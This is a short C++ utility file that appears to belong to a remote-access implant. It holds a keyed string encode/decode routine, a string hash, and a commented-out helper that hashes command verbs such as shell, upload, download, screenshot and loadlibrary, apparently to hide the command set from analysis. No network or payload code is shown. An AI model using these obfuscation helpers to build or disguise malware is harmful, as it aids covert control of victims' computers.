#include "util.h"

// Encodes string using key
std::string encode(std::string key, std::string clear) {
	std::string enc = "";
	char key_c;
	std::string enc_c;
	int placeholder;

	for (UINT i = 0; i < clear.length(); i++) {
		key_c = key[i % key.length()];
		placeholder = int(clear[i]) + int(key_c);
		enc_c = (placeholder % 127);
		enc.append(enc_c);
	}
	return enc;
}

 
// Decodes string using key
std::string decode(std::string key, std::string enc) {
	std::string dec = "";
	char key_c;
	std::string dec_c;
	int placeholder;

	for (UINT i = 0; i < enc.length(); i++) {
		key_c = key[i % key.length()];
		placeholder = 127 + int(enc[i]) - int(key_c);
		dec_c = (placeholder % 127);
		dec.append(dec_c);
	}
	return dec;
}

// Returns a hash given a string using slightly modified Horner's rule
// https://cseweb.ucsd.edu/~kube/cls/100/Lectures/lec16/lec16-16.html
long stringhash(std::string key) {
	long hashVal = 0;
	for (int i = 0; i < key.length(); i++) {
		hashVal = (hashVal << 4) + key[i];
		long g = hashVal & 0xF0000000L;
		if (g != 0) 
			hashVal ^= g >> 24;
		hashVal &= ~g;
	}
	return hashVal;
}

/*
	ALWAYS LEAVE OUT OF FINAL BUILD
	Used to generate hashes for each of the action verbs
*/
/*
void generatehashes() {
	printf("%d\n", stringhash("ok"));
	printf("%d\n", stringhash("info"));
	printf("%d\n", stringhash("ps"));
	printf("%d\n", stringhash("shell"));
	printf("%d\n", stringhash("upload"));
	printf("%d\n", stringhash("download"));
	printf("%d\n", stringhash("kill"));
	printf("%d\n", stringhash("screenshot"));
	printf("%d\n", stringhash("loadlibrary"));
}
*/